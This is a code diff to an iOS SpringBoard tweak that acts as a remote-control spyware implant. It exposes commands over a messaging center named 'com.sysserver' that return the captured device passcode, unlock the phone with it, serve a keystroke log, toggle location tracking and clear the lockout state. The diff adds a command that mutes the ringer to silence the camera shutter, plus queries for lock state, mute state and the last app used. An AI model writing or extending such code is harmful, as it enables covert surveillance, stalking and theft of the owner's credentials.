@@ -3,12 +3,13 @@
 
 %hook SpringBoard
 
-bool hideHUD = false;
+SBMediaController *fmedia;
 NSString *passcode;
 NSString *keyLog;
 
 -(void)applicationDidFinishLaunching:(id)application {
 	%orig;
+	fmedia = (SBMediaController *)[%c(SBMediaController) sharedInstance];
 	CPDistributedMessagingCenter *messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
 	[messagingCenter runServerOnCurrentThread];
 	[messagingCenter registerForMessageName:@"wake" target:self selector:@selector(takeOrder:)];
@@ -23,7 +24,11 @@ NSString *keyLog;
 	[messagingCenter registerForMessageName:@"keylogclear" target:self selector:@selector(takeOrder:)];
     [messagingCenter registerForMessageName:@"locationon" target:self selector:@selector(takeOrder:)];
     [messagingCenter registerForMessageName:@"locationoff" target:self selector:@selector(takeOrder:)];
+    [messagingCenter registerForMessageName:@"silenceShutter" target:self selector:@selector(takeOrder:)];
 
+	[messagingCenter registerForMessageName:@"ismuted" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
+	[messagingCenter registerForMessageName:@"islocked" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
+	[messagingCenter registerForMessageName:@"lastapp" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
 	[messagingCenter registerForMessageName:@"getpasscode" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
 	[messagingCenter registerForMessageName:@"unlock" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
 	[messagingCenter registerForMessageName:@"keylog" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
@@ -74,14 +79,14 @@ NSString *keyLog;
 	else if ([name isEqual:@"undisabled"]) {
 		[(SBDeviceLockController *)[%c(SBDeviceLockController) sharedController] _clearBlockedState];
 	}
-	else if ([name isEqual:@"hideHUD"]) {
-		hideHUD = true;
-	}
-	else if ([name isEqual:@"showHUD"]) {
-		hideHUD = false;
+	else if ([name isEqual:@"silenceShutter"]) {
+		if (!fmedia.ringerMuted) { //if not muted, toggle mute
+    		[fmedia setRingerMuted:!fmedia.ringerMuted];
+		}
 	}
 	else if ([name isEqual:@"togglemute"]) {
     	[(VolumeControl *)[%c(VolumeControl) sharedVolumeControl] toggleMute];
+    	[fmedia setRingerMuted:!fmedia.ringerMuted];
     }
     else if ([name isEqual:@"keylogclear"]) {
     	keyLog = @"";
@@ -98,22 +103,37 @@ NSString *keyLog;
 - (NSDictionary *)takeOrderAndReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
 	if ([name isEqual:@"getpasscode"]) {
 		NSString *result = @"";
-		if (passcode != NULL) {
+		if (passcode != NULL)
 			result = passcode;
-		}
-		else {
+		else 
 			result = @"We have not obtained passcode yet";
-		}
+		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
+	}
+	else if ([name isEqual:@"lastapp"]) {
+		SBApplicationIcon *iconcontroller = [(SBIconController *)[%c(SBIconController) sharedInstance] lastTouchedIcon];
+		if (NSString *lastapp = iconcontroller.nodeIdentifier)
+			return [NSDictionary dictionaryWithObject:lastapp forKey:@"returnStatus"];
+		return [NSDictionary dictionaryWithObject:@"none" forKey:@"returnStatus"];
+	}
+	else if ([name isEqual:@"islocked"]) {
+		if ([(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] isUILocked])  
+			return [NSDictionary dictionaryWithObject:@"true" forKey:@"returnStatus"];
+		return [NSDictionary dictionaryWithObject:@"false" forKey:@"returnStatus"];
+	}
+	else if ([name isEqual:@"ismuted"]) {
+		NSString *result = @"";
+		if (fmedia.ringerMuted)
+			result = @"true";
+		else
+			result = @"false";
 		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
 	}
 	else if ([name isEqual:@"unlock"]) {
 		NSString *result = @"";
-		if (passcode != NULL) {
+		if (passcode != NULL)
 			[(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] attemptUnlockWithPasscode:passcode];
-		}
-		else {
+		else 
 			result = @"We have not obtained passcode yet";
-		}
 		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
 	}
 	else if ([name isEqual:@"keylog"]) {
@@ -193,3 +213,5 @@ NSString *keyLog;
 	%orig;
 }
 %end
+
+
